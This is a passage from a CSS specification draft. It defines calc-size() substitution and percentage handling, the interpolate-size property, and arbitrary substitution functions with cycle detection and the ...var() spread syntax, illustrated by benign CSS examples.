    <a id="ref-for-calc-size-basis①⑤"></a>

    Otherwise, if the [calc-size basis](#calc-size-basis) is any other [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) (contains a percentage)

    <a id="ref-for-de-percentify-a-calc-size-calculation"></a>

    <a id="ref-for-substitute-into-a-calc-size-calculation②"></a>

    <a id="ref-for-calc-size-calculation①⑧"></a>

    Replace the basis with 100% and the original basis is [de-percentified](#de-percentify-a-calc-size-calculation), then [substituted](#substitute-into-a-calc-size-calculation) into the [calc-size calculation](#calc-size-calculation).

    <a id="ref-for-substitute-into-a-calc-size-calculation③"></a>

    If any [substitute into a calc-size calculation](#substitute-into-a-calc-size-calculation) returns failure, the entire operation immediately returns failure.

2.  <a id="ref-for-calc-size-calculation①⑨"></a>

    Next, simplify the [calc-size calculation](#calc-size-calculation) as defined in [CSS Values 4 § 10.10.1 Simplification](https://drafts.csswg.org/css-values-4/#calc-simplification).

<a id="ref-for-calc-size-basis①⑥"></a>

<a id="ref-for-funcdef-calc-size④③"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: After simplification, the [calc-size basis](#calc-size-basis) of a [calc-size()](#funcdef-calc-size) function will either be a single keyword or the value 100%.

To <a id="substitute-into-a-calc-size-calculation"></a>substitute into a calc-size calculation <var>calc</var> a value <var>insertion value</var>:

1.  <a id="ref-for-valdef-calc-size-size⑧"></a>

    If <var>calc</var> doesn’t have the [size](#valdef-calc-size-size) keyword in it, do nothing.

2.  <a id="ref-for-valdef-calc-size-size⑨"></a>

    Otherwise, replace every instance of the [size](#valdef-calc-size-size) keyword in <var>calc</var> with <var>insertion value</var>, wrapped in parentheses.

3.  If this substitution would produce a value larger than an UA-defined limit, return failure.

    <a id="ref-for-funcdef-calc-size④④"></a>

    > <strong data-conversion-semantic="note">Note</strong>
    >
    > Note: This is intentionally identical to the protection against substitution attacks defined for variable substitution; see [CSS Variables 1 § 3.3 Safely Handling Overly-Long Variables](https://www.w3.org/TR/css-variables-1/#long-variables). However, the use-cases for very long [calc-size()](#funcdef-calc-size) values are much less than for long custom properties, so UAs might wish to impose a smaller size limit.

To <a id="de-percentify-a-calc-size-calculation"></a>de-percentify a calc-size calculation <var>calc</var>:

1.  <a id="ref-for-typedef-percentage-token"></a>

    Replace every instance of a [\<percentage-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-percentage-token) in <var>calc</var> with (size \* N), where N is the percentage’s value divided by 100. Return <var>calc</var>.

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: For example, 50% + 20px becomes (size \* .5) + 20px.

> <strong data-conversion-semantic="note">Note</strong>
>
> Why are percentages simplified in this way?
>
> This percentage simplification ensures that transitions work linearly.
>
> For example, say that 100% resolves to 100px.
>
> If you transitioned from calc-size(100px, size \* 2) (resolves to 200px) to calc-size(50%, size - 20px) (resolves to 30px) by interpolating both the arguments, then at the halfway point you’d have calc-size(75px, size \* 2 \* .5 + (size - 20px) \* .5) (resolves to 102.5px), which is <em>not</em> halfway between 30 and 200 (that would be 115px). Interpolating one argument, then substituting it into another calculation and interpolating that one too, generally gives <em>quadratic</em> interpolation behavior.
>
> Instead, we substitute the basis arg into the calculation arg, so you get calc-size(any, 100px \* 2) and calc-size(100%, (size \* .5) - 20px), and when interpolated, at the halfway point you get calc-size(100%, 100px \* 2 \* .5 + ((size \* .5) - 20px) \* .5), which does indeed resolve to 115px, as expected. Other points in the transition are similarly linear.

<a id="ref-for-propdef-interpolate-size①"></a>

### <a id="interpolate-size"></a>11.3.  Automatically interpolating sizing keywords: the [interpolate-size](#propdef-interpolate-size) property



| Field               | Definition                                                                                           |
|---------------------|------------------------------------------------------------------------------------------------------|
| <strong>Name:&#xA;     </strong> | <a id="propdef-interpolate-size"></a>interpolate-size                                                                  |
| <strong><a href="https://www.w3.org/TR/css-values/#value-defs">Value:</a>&#xA;     </strong> | <a id="ref-for-comb-one①①③"></a>numeric-only [\|](https://drafts.csswg.org/css-values-4/#comb-one) allow-keywords |
| <strong><a href="https://www.w3.org/TR/css-cascade/#initial-values">Initial:</a>&#xA;     </strong> | numeric-only                                                                                         |
| <strong><a href="https://www.w3.org/TR/css-cascade/#inherited-property">Inherited:</a>&#xA;     </strong> | yes                                                                                                  |
| <strong><a href="https://www.w3.org/TR/css-cascade/#applies-to">Applies to:</a>&#xA;     </strong> | [all elements](https://www.w3.org/TR/css-pseudo/#generated-content)                                  |
| <strong><a href="https://www.w3.org/TR/css-cascade/#computed">Computed value:</a>&#xA;     </strong> | as specified                                                                                         |
| <strong><a href="https://www.w3.org/TR/web-animations/#animation-type">Animation type:</a>&#xA;     </strong> | not animatable                                                                                       |



<a id="ref-for-sizing-property"></a>

<a id="ref-for-typedef-length-percentage②③"></a>

<a id="ref-for-discrete"></a>

This property allows keywords on the [sizing properties](https://drafts.csswg.org/css-sizing-3/#sizing-property) to smoothly combine with [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) values rather than using [discrete](https://drafts.csswg.org/web-animations-1/#discrete) animation for this case. (See [Web Animations § 5.2 Animating properties](https://drafts.csswg.org/web-animations-1/#animating-properties).)

<a id="valdef-interpolate-size-numeric-only"></a>numeric-only  
<a id="ref-for-funcdef-calc-size④⑤"></a>

<a id="ref-for-typedef-calc-size-size-keyword②"></a>

A [\<size-keyword\>](#typedef-calc-size-size-keyword) can only be combined with a compatible [\<calc-size()\>](#funcdef-calc-size).

<a id="valdef-interpolate-size-allow-keywords"></a>allow-keywords  
<a id="ref-for-typedef-length-percentage②④"></a>

<a id="ref-for-typedef-calc-size-size-keyword③"></a>

Sizing values can also be combined if one of them is an [\<size-keyword\>](#typedef-calc-size-size-keyword) and the other is a [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage). This is done by treating the <a id="ref-for-typedef-calc-size-size-keyword④"></a>\<size-keyword\> <var>keyword</var> as though it is calc-size(<var>keyword</var>, size) and applying the rules in [§ 11.2 Interpolating calc-size()](#interpolate-calc-size). In other cases, a <a id="ref-for-typedef-calc-size-size-keyword⑤"></a>\<size-keyword\> still cannot be interpolated.

<a id="ref-for-valdef-interpolate-size-allow-keywords"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Setting [allow-keywords](#valdef-interpolate-size-allow-keywords) allows <em>most</em> size values to be interpolated, but not all; different keywords are still not interpolable with each other, as layout algorithms can change their behavior based on precisely which sizing keyword a descendant is using, in a way that can’t be represented during interpolation.

<a id="ref-for-valdef-interpolate-size-allow-keywords①"></a>

<a id="ref-for-funcdef-calc-size④⑥"></a>

<a id="ref-for-containing-block①"></a>

<a id="ref-for-indefinite①"></a>

<a id="ref-for-propdef-width⑧"></a>

<a id="ref-for-behave-as-auto①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Setting [allow-keywords](#valdef-interpolate-size-allow-keywords) <em>mostly</em> removes the need to use [calc-size()](#funcdef-calc-size) manually, but there are still some cases that can benefit from using it. For example, if the [containing block](https://drafts.csswg.org/css-display-4/#containing-block) size is [indefinite](https://drafts.csswg.org/css-sizing-3/#indefinite), naively interpolating [width: 100%](https://drafts.csswg.org/css-sizing-3/#propdef-width) to <a id="ref-for-propdef-width⑨"></a>width: 0px won’t work as expected (since the intermediate values might [behave as auto](https://drafts.csswg.org/css-sizing-3/#behave-as-auto), making them the same size as 100%), but manually writing <a id="ref-for-propdef-width①⓪"></a>width: calc-size(100%, size); and/or <a id="ref-for-propdef-width①①"></a>width: calc-size(any, 0px); will, causing the element to smoothly interpolate between the two values.

<a id="ref-for-valdef-interpolate-size-allow-keywords②"></a>

<a id="ref-for-valdef-width-auto⑤"></a>

<a id="ref-for-valdef-width-min-content⑤"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: If we had a time machine, this property wouldn’t exist; the [allow-keywords](#valdef-interpolate-size-allow-keywords) behavior would just be how things worked by default. It exists because many existing style sheets assume that the sizing keywords ([auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto), [min-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-min-content), etc.) cannot interpolate at all, and would produce broken behavior if they started interpolating. For compatibility with this assumption, allowing this interpolation requires an opt-in. Because the property inherits, specifying :root { interpolate-size: allow-keywords; } allows the new behavior for the entire page. We suggest doing this wherever compatibility isn’t an issue.

<a id="ref-for-propdef-interpolate-size②"></a>

<a id="ref-for-computed-value②④"></a>

<a id="ref-for-after-change-style"></a>

The value of [interpolate-size](#propdef-interpolate-size) that matters is the [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) on the element at the time the animation might start. For CSS transitions, this means the value in the [after-change style](https://drafts.csswg.org/css-transitions-1/#after-change-style). An animation is not stopped or started later because <a id="ref-for-propdef-interpolate-size③"></a>interpolate-size changes.

## <a id="arbitrary-substitution"></a> Appendix A: Arbitrary Substitution Functions

<a id="ref-for-functional-notation⑨"></a>

An <a id="arbitrary-substitution-function"></a>arbitrary substitution function is a [functional notation](https://drafts.csswg.org/css-values-4/#functional-notation) that will, when resolved, substitute itself with other values that are unknowable at parse time.

### <a id="substitution"></a> Substitution

<a id="ref-for-arbitrary-substitution-function①①"></a>

<a id="ref-for-stack"></a>

<a id="ref-for-substitution-context③"></a>

<a id="ref-for-substitute-arbitrary-substitution-function①②"></a>

<a id="ref-for-component-value④"></a>

Each [arbitrary substitution function](#arbitrary-substitution-function) must define how to <a id="replace-an-arbitrary-substitution-function"></a>replace an arbitrary substitution function for itself, given a list of arguments and a [stack](https://infra.spec.whatwg.org/#stack) of [substitution contexts](#substitution-context), and likely involving further [substitution](#substitute-arbitrary-substitution-function). It must return a sequence of [component values](https://drafts.csswg.org/css-syntax-3/#component-value) (fully resolved, so no further <a id="ref-for-arbitrary-substitution-function①②"></a>arbitrary substitution functions exist in the sequence), which it will be replaced by.

<a id="ref-for-replace-an-arbitrary-substitution-function⑥"></a>

<a id="ref-for-argument-grammar⑤"></a>

<a id="ref-for-substitute-arbitrary-substitution-function①③"></a>

<a id="ref-for-css-parse-something-according-to-a-css-grammar①①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> A function’s [replacement](#replace-an-arbitrary-substitution-function) algorithm is called with the results of [early substitution](#early-resolution) and parsing with the function’s [argument grammar](#argument-grammar), but nothing more. The algorithm will have to further [substitute](#substitute-arbitrary-substitution-function) each argument it deals with, before [parsing](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) it as the appropriate part of its <em>normal</em> grammar, and then performing whatever logic it needs.
>
> <a id="ref-for-funcdef-attr②②"></a>
>
> <a id="ref-for-typedef-if-condition③"></a>
>
> <a id="ref-for-funcdef-if①②"></a>
>
> <a id="ref-for-typedef-if-branch③"></a>
>
> It might leave some arguments completely unsubstituted (for example, the fallback argument of an [attr()](#funcdef-attr) function, if the attribute value exists and correctly parses), or only parse some arguments based on the results of evaluating other arguments (for example, later [\<if-condition\>](#typedef-if-condition) values in an [if()](#funcdef-if) function are only evaluated if earlier ones evaluated as false, and only the result in the "successful" [\<if-branch\>](#typedef-if-branch) is evaluated).

<a id="ref-for-component-value⑤"></a>

<a id="ref-for-substitution-context④"></a>

To <a id="substitute-arbitrary-substitution-function"></a>substitute arbitrary substitution functions in a sequence of [component values](https://drafts.csswg.org/css-syntax-3/#component-value) <var>values</var>, given an optional [substitution context](#substitution-context) <var>context</var>:

1.  <a id="ref-for-guarded①"></a>

    <a id="ref-for-cyclic-substitution-contexts①"></a>

    <a id="ref-for-guaranteed-invalid-value①③"></a>

    [Guard](#guarded) <var>context</var> for the remainder of this algorithm. If <var>context</var> is marked as a [cyclic substitution context](#cyclic-substitution-contexts), return the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

2.  <a id="ref-for-list-iterate①"></a>

    <a id="ref-for-arbitrary-substitution-function①③"></a>

    [For each](https://infra.spec.whatwg.org/#list-iterate) [arbitrary substitution function](#arbitrary-substitution-function) <var>func</var> in <var>values</var> (ordered via a depth-first pre-order traversal) that is not nested in the contents of another <a id="ref-for-arbitrary-substitution-function①④"></a>arbitrary substitution function:

    1.  <a id="ref-for-substitute-early-invoked-functions"></a>

        [Substitute early-invoked functions](#substitute-early-invoked-functions) in <var>func</var>’s contents, and let <var>early result</var> be the result.

    2.  <a id="ref-for-guaranteed-invalid-value①④"></a>

        <a id="ref-for-iteration-continue②"></a>

        If <var>early result</var> contains the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), replace <var>func</var> in <var>values</var> with the <a id="ref-for-guaranteed-invalid-value①⑤"></a>guaranteed-invalid value and [continue](https://infra.spec.whatwg.org/#iteration-continue).

    3.  <a id="ref-for-css-parse-something-according-to-a-css-grammar①②"></a>

        <a id="ref-for-argument-grammar⑥"></a>

        <a id="ref-for-guaranteed-invalid-value①⑥"></a>

        <a id="ref-for-iteration-continue③"></a>

        [Parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) <var>early result</var> according to <var>func</var>’s [argument grammar](#argument-grammar). If this returns failure, replace <var>func</var> in values with the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value) and [continue](https://infra.spec.whatwg.org/#iteration-continue); otherwise, let <var>arguments</var> be the result.

    4.  <a id="ref-for-replace-an-arbitrary-substitution-function⑦"></a>

        <a id="ref-for-component-value⑥"></a>

        [Replace an arbitrary substitution function](#replace-an-arbitrary-substitution-function) for <var>func</var>, given <var>arguments</var>, as defined by that function. Let <var>result</var> be the returned list of [component values](https://drafts.csswg.org/css-syntax-3/#component-value).

    5.  <a id="ref-for-guaranteed-invalid-value①⑦"></a>

        If <var>result</var> contains the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), replace <var>func</var> in <var>values</var> with the <a id="ref-for-guaranteed-invalid-value①⑧"></a>guaranteed-invalid value. Otherwise, replace <var>func</var> in <var>values</var> with <var>result</var>.

3.  <a id="ref-for-cyclic-substitution-contexts②"></a>

    <a id="ref-for-guaranteed-invalid-value①⑨"></a>

    <a id="ref-for-arbitrary-substitution-function①⑤"></a>

    <a id="ref-for-cyclic-substitution-contexts③"></a>

    If <var>context</var> is marked as a [cyclic substitution context](#cyclic-substitution-contexts), return the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value). <strong data-conversion-semantic="note">Note:</strong> Nested [arbitrary substitution functions](#arbitrary-substitution-function) may have marked <var>context</var> as [cyclic](#cyclic-substitution-contexts) in step 2.

4.  Return <var>values</var>.

<a id="ref-for-list③"></a>

A <a id="substitution-context"></a>substitution context is a [list](https://infra.spec.whatwg.org/#list) consisting of: the dependency type, as a string; one or more additional values, specific to the dependency type. (Usually, just one additional string.)

<a id="ref-for-arbitrary-substitution-function①⑥"></a>

<a id="ref-for-resolve"></a>

<a id="ref-for-substitution-context⑤"></a>

As [arbitrary substitution functions](#arbitrary-substitution-function) are [resolved](https://webidl.spec.whatwg.org/#resolve) they accumulate [substitution contexts](#substitution-context) which affect how <em>nested</em> <a id="ref-for-arbitrary-substitution-function①⑦"></a>arbitrary substitution functions resolve.

<a id="ref-for-substitute-arbitrary-substitution-function①④"></a>

<a id="ref-for-substitution-context⑥"></a>

<a id="ref-for-arbitrary-substitution-function①⑧"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-598159b1"></a> For example, while resolving a var(--foo) function, the value of the --foo property is fetched and [substituted](#substitute-arbitrary-substitution-function), with a [substitution context](#substitution-context) of `«"property", "--foo"»`, preventing any nested [arbitrary substitution functions](#arbitrary-substitution-function) from cyclicly depending on --foo as well.
>
> <a id="ref-for-substitute-arbitrary-substitution-function①⑤"></a>
>
> <a id="ref-for-substitution-context⑦"></a>
>
> While resolving an attr(foo) function, the value of the foo attribute on the element is fetched and [substituted](#substitute-arbitrary-substitution-function), with a [substitution context](#substitution-context) of `«"attribute", "foo"»`, preventing any nested functions from cyclicly depending on the foo attribute as well.

<a id="ref-for-substitution-context⑧"></a>

The types of [substitution contexts](#substitution-context) are currently:

- <a id="ref-for-custom-function③"></a>

  "property", followed by a property name, and optionally a [custom function](https://drafts.csswg.org/css-mixins-1/#custom-function).

- "attribute", followed by an attribute name.

- <a id="ref-for-custom-function④"></a>

  "function", followed by a [custom function](https://drafts.csswg.org/css-mixins-1/#custom-function).

<a id="ref-for-substitute-arbitrary-substitution-function①⑥"></a>

<a id="ref-for-arbitrary-substitution-function①⑨"></a>

<a id="ref-for-replace-an-arbitrary-substitution-function⑧"></a>

<a id="ref-for-guarded②"></a>

<a id="ref-for-substitution-context⑨"></a>

As [substitution](#substitute-arbitrary-substitution-function) is recursively invoked by nested [arbitrary substitution functions](#arbitrary-substitution-function) being [replaced](#replace-an-arbitrary-substitution-function), [guards](#guarded) "stack up" the [substitution contexts](#substitution-context) passed to each invocation.

<a id="ref-for-substitution-context①⓪"></a>

When a [substitution context](#substitution-context) is <a id="guarded"></a>guarded, it means that, for the duration of the guard, an attempt to guard a matching <a id="ref-for-substitution-context①①"></a>substitution context again will mark all <a id="ref-for-substitution-context①②"></a>substitution contexts involved in the cycle as <a id="cyclic-substitution-contexts"></a>cyclic substitution contexts.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-db049997"></a> For example, given the following style:
>
> ```text
> .foo {
>   --one: var(--two);
>   --two: var(--one);
> }
> ```
>
> <a id="ref-for-property-replacement①"></a>
>
> <a id="ref-for-substitute-arbitrary-substitution-function①⑦"></a>
>
> <a id="ref-for-substitution-context①③"></a>
>
> <a id="ref-for-replace-an-arbitrary-substitution-function⑨"></a>
>
> [Property replacement](#property-replacement) for --one invokes [substitution](#substitute-arbitrary-substitution-function) with a [substitution context](#substitution-context) of «"property", "--one"». <a id="ref-for-substitute-arbitrary-substitution-function①⑧"></a>Substitution sees the var(--two) function and invokes [replace a var() function](#replace-an-arbitrary-substitution-function), which fetches the values of --two and <a id="ref-for-substitute-arbitrary-substitution-function①⑨"></a>substitutes again, this time with a <a id="ref-for-substitution-context①④"></a>substitution context of «"property", "--two"». That <a id="ref-for-substitute-arbitrary-substitution-function②⓪"></a>substitution sees the var(--one) function and invokes <a id="ref-for-replace-an-arbitrary-substitution-function①⓪"></a>replace a var() function, which fetches the value of --one and <a id="ref-for-substitute-arbitrary-substitution-function②①"></a>substitutes again, with a <a id="ref-for-substitution-context①⑤"></a>substitution context of «"property", "--one"».
>
> <a id="ref-for-cyclic-substitution-contexts④"></a>
>
> <a id="ref-for-substitution-context①⑥"></a>
>
> <a id="ref-for-substitute-arbitrary-substitution-function②②"></a>
>
> <a id="ref-for-guaranteed-invalid-value②⓪"></a>
>
> <a id="ref-for-invalid-at-computed-value-time⑤"></a>
>
> <a id="ref-for-property-replacement②"></a>
>
> This, finally, is a [cyclic substitution context](#cyclic-substitution-contexts), since it matches the [substitution context](#substitution-context) from the first [substitution](#substitute-arbitrary-substitution-function), causing the <a id="ref-for-substitute-arbitrary-substitution-function②③"></a>substitution to just produce the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value). This percolates back up the nested invocations, eventually resulting in --one becoming [invalid at computed-value time](#invalid-at-computed-value-time). The same happens, in opposite order, when performing [property replacement](#property-replacement) on --two.

<a id="ref-for-cyclic-substitution-contexts⑤"></a>

<a id="ref-for-invalid-at-computed-value-time⑥"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-e48a0f6b"></a> When a [cycle is detected](#cyclic-substitution-contexts), all participants in the cycle become invalid. For example, all of the following declarations become [invalid at computed-value time](#invalid-at-computed-value-time).
>
> ```text
> .foo {
>   --one: var(--two);
>   --two: var(--three, baz);
>   --three: var(--one);
> }
> ```
>
> The presence of a fallback in `var(--three, baz)` does not affect the outcome.

### <a id="early-resolution"></a> Argument Grammars and Spread Syntax

<a id="ref-for-arbitrary-substitution-function②⓪"></a>

Each [arbitrary substitution function](#arbitrary-substitution-function), in addition to its standard grammar, must define an <a id="argument-grammar"></a>argument grammar: a much less specific and less restrictive version of its normal grammar, which serves solely to separate the function’s contents into distinct arguments.

<a id="ref-for-argument-grammar⑦"></a>

<a id="ref-for-typedef-declaration-value③⑦"></a>

<a id="ref-for-funcdef-if①③"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Typically, an [argument grammar](#argument-grammar) will only consist of some punctuation (usually commas) and the [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) production. See the [if()](#funcdef-if) function for an example.

<a id="ref-for-replace-an-arbitrary-substitution-function①①"></a>

<a id="ref-for-substitute-arbitrary-substitution-function②④"></a>

<a id="ref-for-css-parse-something-according-to-a-css-grammar①③"></a>

Each function, in its [replacement](#replace-an-arbitrary-substitution-function) algorithm, will apply [substitution](#substitute-arbitrary-substitution-function) to its arguments and then [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) them according to the appropriate parts of its standard grammar. As it is in control of this process, however, some arguments can be left unresolved and unparsed.

<a id="ref-for-funcdef-if①④"></a>

<a id="ref-for-argument-grammar⑧"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-eeb64de1"></a> For example, the [if()](#funcdef-if) function’s [argument grammar](#argument-grammar) merely divides its value into alternating "test" and "result" arguments, separated by \`:\` and \`;\`. It then evaluates tests one by one, and only evaluates a single argument matching the first successful test.
>
> <a id="ref-for-funcdef-if①⑤"></a>
>
> This allows [if()](#funcdef-if) to achieve behavior similar to \`if\` constructs in other programming languages, where later "branches" aren’t evaluated at all (beyond a basic parse) and thus can’t cause errors in cases that would be caught by earlier branches.
>
> <a id="ref-for-valdef-color-blue"></a>
>
> <a id="ref-for-funcdef-if①⑥"></a>
>
> <a id="ref-for-invalid-at-computed-value-time⑦"></a>
>
> This means the following is a valid declaration when the viewport is 600px or wider, resulting in the value [blue](https://drafts.csswg.org/css-color-4/#valdef-color-blue). Only when the viewport is narrower than 600px does the [if()](#funcdef-if) trigger cyclic behavior and cause --color to be [invalid at computed-value time](#invalid-at-computed-value-time).
>
> ```text
> .foo {
>   --color: if(media(width >= 600px): blue; else: var(--color));
> }
> ```
<a id="ref-for-argument-grammar⑨"></a>

<a id="ref-for-arbitrary-substitution-function②①"></a>

This also means that, ordinarily, parsing according to a function’s [argument grammar](#argument-grammar) <em>does not</em> see the results of any nested [arbitrary substitution functions](#arbitrary-substitution-function); the contents are divided into arguments based only on the values literally present inside the function.

<a id="ref-for-funcdef-random-item①③"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-af866466"></a> For example, in random-item(auto, var(--foo), var(--bar)), the [random-item()](#funcdef-random-item) function selects between two random values, either the result of var(--foo) or var(--bar). This is true even if one of them contains commas, like:
>
> ```text
> .random-fonts {
>   --foo: Courier, monospace;
>   --bar: Arial, serif;
>   font-family: random-item(auto, var(--foo), var(--bar));
>   /* equivalent to: */
>   font-family: random-item(auto, {Courier, monospace}, {Arial, serif});
> 
>   /* and thus, randomly, equivalent to either */
>   font-family: Courier, monospace;
>   /* or */
>   font-family: Arial, serif;
> }
> ```
>
> <a id="ref-for-arbitrary-substitution-function②②"></a>
>
> This behavior ensures that authors don’t have to defensively wrap any arguments containing [arbitrary substitution functions](#arbitrary-substitution-function) in {} characters; what you see is what you get.

<a id="ref-for-arbitrary-substitution-function②③"></a>

<a id="ref-for-argument-grammar①⓪"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This is different from the behavior of [arbitrary substitution functions](#arbitrary-substitution-function) substituted into "normal" functions or properties. For example, --colors: red, blue, green; background: linear-gradient(var(--colors)); works in the expected fashion, producing a gradient with three color stops, because normal functions don’t do this separate [argument grammar](#argument-grammar) parse.

<a id="ref-for-arbitrary-substitution-function②④"></a>

This behavior can be worked around by immediately preceding an [arbitrary substitution function](#arbitrary-substitution-function) with the <a id="spread-syntax"></a>spread syntax ..., indicating that it must be resolved "early", before division into arguments.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-20069a0e"></a> For example, the following <strong>will not work</strong>:
>
> ```text
> .invalid-if {
>   --if-clause: media(width >= 600px): blue;
>   color: if(var(--if-clause); else: green;);
> }
> ```
>
> <a id="ref-for-funcdef-if①⑦"></a>
>
> <a id="ref-for-argument-grammar①①"></a>
>
> The [if()](#funcdef-if) function entirely fails to parse according to its [argument grammar](#argument-grammar): there’s no \`:\` character separating the test from the value in the first branch.
>
> To get the desired behavior of "spreading" the variable into the function’s arguments, use ...':
>
> ```text
> .valid-if {
>   --if-clause: media(width >= 600px): blue;
>   color: if(...var(--if-clause); else: green;);
> }
> ```
<a id="ref-for-spread-syntax"></a>

<a id="ref-for-typedef-delim-token④"></a>

<a id="ref-for-arbitrary-substitution-function②⑤"></a>

The [spread syntax](#spread-syntax) is three distinct [\<delim-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-delim-token)s with the value \`"."\`, all of which must not contain any whitespace between them, or between the group and the subsequent [arbitrary substitution function](#arbitrary-substitution-function).

<a id="ref-for-spread-syntax①"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-6f229e26"></a> That is, ...var(--foo) is a valid use of the [spread syntax](#spread-syntax), but ... var(--foo) is not, nor is . . .var(--foo).
>
> <a id="ref-for-arbitrary-substitution-function②⑥"></a>
>
> <a id="ref-for-argument-grammar①②"></a>
>
> The latter usages will result in the [arbitrary substitution function](#arbitrary-substitution-function) being evaluated at the normal time, <em>after</em> the [argument grammar](#argument-grammar) has been applied, and the period characters being part of the function’s value.

<a id="ref-for-spread-syntax②"></a>

<a id="ref-for-arbitrary-substitution-function②⑦"></a>

<a id="ref-for-substitute-arbitrary-substitution-function②⑤"></a>

<a id="ref-for-propdef-width①②"></a>

<a id="ref-for-funcdef-var①①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [spread syntax](#spread-syntax) is only used <em>within</em> an [arbitrary substitution function’s](#arbitrary-substitution-function) value, as it’s only referenced by the [substitution](#substitute-arbitrary-substitution-function) algorithm when parsing an <a id="ref-for-arbitrary-substitution-function②⑧"></a>arbitrary substitution function. Using it outside of that, such as in [width: ...var(--sidebar-width);](https://drafts.csswg.org/css-sizing-3/#propdef-width), is not recognized as an early invocation; instead, the periods are just part of the property’s value, unrelated to the [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) function, and would in this case make the <a id="ref-for-propdef-width①③"></a>width property invalid. (This is similar to JavaScript, where this syntax was borrowed from, where \`\[1, ...arr, 5\]\` is valid, but \`var x = ...arr;\` is not.)

<a id="ref-for-component-value⑦"></a>

To <a id="substitute-early-invoked-functions"></a>substitute early-invoked functions in a sequence of [component values](https://drafts.csswg.org/css-syntax-3/#component-value) <var>values</var>:

1.  <a id="ref-for-list-iterate②"></a>

    <a id="ref-for-arbitrary-substitution-function②⑨"></a>

    <a id="ref-for-spread-syntax③"></a>

    [For each](https://infra.spec.whatwg.org/#list-iterate) [arbitrary substitution function](#arbitrary-substitution-function) <var>func</var> in <var>values</var> (ordered via a depth-first pre-order traversal) using the [spread syntax](#spread-syntax) that is not nested in the contents of another <a id="ref-for-arbitrary-substitution-function③⓪"></a>arbitrary substitution function:

    1.  <a id="ref-for-substitute-early-invoked-functions①"></a>

        [Substitute early-invoked functions](#substitute-early-invoked-functions) in <var>func</var>’s contents, and let <var>early result</var> be the result.

    2.  <a id="ref-for-guaranteed-invalid-value②①"></a>

        <a id="ref-for-iteration-continue④"></a>

        If <var>early result</var> contains the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), replace <var>func</var> in <var>values</var> with the <a id="ref-for-guaranteed-invalid-value②②"></a>guaranteed-invalid value and [continue](https://infra.spec.whatwg.org/#iteration-continue).

    3.  <a id="ref-for-css-parse-something-according-to-a-css-grammar①④"></a>

        <a id="ref-for-argument-grammar①③"></a>

        <a id="ref-for-guaranteed-invalid-value②③"></a>

        <a id="ref-for-iteration-continue⑤"></a>

        [Parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) <var>early result</var> acccording to <var>func</var>’s [argument grammar](#argument-grammar). If this returns failure, replace <var>func</var> in values with the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value) and [continue](https://infra.spec.whatwg.org/#iteration-continue); otherwise, let <var>arguments</var> be the result.

    4.  <a id="ref-for-replace-an-arbitrary-substitution-function①②"></a>

        <a id="ref-for-component-value⑧"></a>

        [Replace an arbitrary substitution function](#replace-an-arbitrary-substitution-function) for <var>func</var>, given <var>arguments</var>, as defined by that function. Let <var>result</var> be the returned list of [component values](https://drafts.csswg.org/css-syntax-3/#component-value).

    5.  <a id="ref-for-guaranteed-invalid-value②④"></a>

        If <var>result</var> contains the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), replace <var>func</var> in <var>values</var> with the <a id="ref-for-guaranteed-invalid-value②⑤"></a>guaranteed-invalid value. Otherwise, replace <var>func</var> in <var>values</var> with <var>result</var>.

2.  Return <var>values</var>.

### <a id="resolve-property"></a> Resolving in Properties

<a id="ref-for-arbitrary-substitution-function③①"></a>

<a id="ref-for-functional-notation①⓪"></a>

Unless otherwise specified, [arbitrary substitution functions](#arbitrary-substitution-function) can be used in place of any part of any property’s value (including within other [functional notations](https://drafts.csswg.org/css-values-4/#functional-notation)); and are not valid in any other context.

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-2cf4bbb3"></a> Should any of these functions be valid in contexts outside of properties?

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/variable-external-font-face-01.html`
- `css/css-variables/variable-font-face-01.html`
- `css/css-variables/variable-font-face-02.html`

> <strong data-conversion-semantic="example">Example</strong>
>
